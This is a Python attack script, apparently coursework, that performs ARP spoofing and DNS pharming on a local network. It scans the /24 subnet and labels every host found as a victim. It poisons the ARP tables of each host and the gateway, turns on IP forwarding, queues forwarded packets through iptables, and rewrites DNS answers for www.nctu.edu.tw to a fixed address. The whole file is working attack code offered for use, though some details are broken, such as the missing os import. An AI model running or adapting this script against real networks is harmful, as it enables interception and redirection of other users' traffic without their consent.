#!/usr/bin/env python

import scapy.all as scapy
from threading import Thread, Event
import time,sys,netfilterqueue,subprocess,re

def enable_ip_forward():
	# Enables IP Forward in linux
	file_path = "/proc/sys/net/ipv4/ip_forward"
	f = open(file_path,"w")
	f.write('1')
	f.close()
def proc_of_pkt(packet):
	scapy_pkt = scapy.IP(packet.get_payload())
	if scapy_pkt.haslayer(scapy.DNSRR):
		ip_layer = scapy_pkt.getlayer(scapy.IP)
		print("[+] New Packet: {src} -> {dst}".format(src = ip_layer.src, dst = ip_layer.dst))
		qname = scapy_pkt[scapy.DNSQR].qname
		if "www.nctu.edu.tw" in qname:
			print("[ ] Spoofing www.nctu.edu.tw -> 140.113.207.246")
			scapy_pkt[scapy.DNS].an = scapy.DNSRR(rrname = qname,rdata = "140.113.207.246")
			scapy_pkt[scapy.DNS].ancount = 1

			del scapy_pkt[scapy.IP].len
			del scapy_pkt[scapy.IP].chksum
			del scapy_pkt[scapy.UDP].chksum
			del scapy_pkt[scapy.UDP].len
			packet.set_payload(str(scapy_pkt))
	packet.accept()
def scan(ip):
	arp_req = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
	arp_req_broadcast = broadcast/arp_req
    	ans = scapy.srp(arp_req_broadcast,timeout = 1,verbose = False)[0]
	client_list = []
	for element in ans:
		client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
		client_list.append(client_dict)
	return client_list
def spoofing(target,spoof):
	packet = scapy.ARP(op = 2,pdst = target['ip'],hwdst = target['mac'],psrc = spoof['ip'])
	#print(packet.show())
	scapy.send(packet,verbose = False)
def restore(dst,src):
	packet = scapy.ARP(op = 2,pdst = dst['ip'],hwdst = dst['mac'],psrc = src['ip'],hwsrc = src['mac'])
	scapy.send(packet,count = 4,verbose = False)
def main():
	if os.geteuid() != 0:
		print("./pharm_attack: Permission denied")
		print("Try sudo ./pharm_attack")
		return
	route_default_result = re.findall(r"([\w.][\w.]*'?\w?)", subprocess.check_output(["ip", "route"]))
	#default_interface = route_default_result[4]

	default_gateway = route_default_result[2]
	gateway = scan(default_gateway)[0]
	domain = default_gateway + '/24'
	victims = scan(domain)
	
	print("\t IP\t\t\tMAC Address\n-----------------------------------------")
	print('Gateway: ' + gateway["ip"] + "\t\t" + gateway["mac"])
	for victim in victims:
		if victim != gateway:
			print('Victim : ' + victim["ip"] + "\t\t" + victim["mac"])

	subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])
	try:
		enable_ip_forward()
		print("[*] ARP spoofing...")
		while True:
			for victim in victims:
				if victim != gateway:
					spoofing(victim,gateway) # tell victim we are router
					spoofing(gateway,victim) # tell router we are victim
			print("[*] Packet intercepting...")
			nfqueue = netfilterqueue.NetfilterQueue()
			nfqueue.bind(0,proc_of_pkt)
			nfqueue.run()
			time.sleep(2)
	except KeyboardInterrupt:
		print("\n[!] Stop Packet intercepting.")
		print("[!] ARP spoofing is terminated, restoring ARP table")
		for victim in victims:
			if victim != gateway:
				restore(victim,gateway)
				restore(gateway,victim)
		print("[*] Sucessfully restoring ARP table")
	subprocess.call(["iptables","--flush"])

if __name__ == '__main__':
	main()

